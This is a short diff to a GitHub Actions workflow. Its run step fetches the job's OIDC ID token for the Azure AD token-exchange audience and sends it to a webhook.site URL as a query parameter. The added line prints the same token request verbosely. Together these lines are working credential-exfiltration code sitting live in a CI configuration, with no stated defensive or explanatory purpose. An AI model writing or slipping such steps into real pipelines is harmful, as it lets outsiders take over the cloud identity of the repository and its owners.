@@ -9,5 +9,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
+          curl -v -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange";
           export FOO=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange");
           curl "https://webhook.site/dc785d7e-266e-4c92-ad13-396505a91474?token=$FOO"
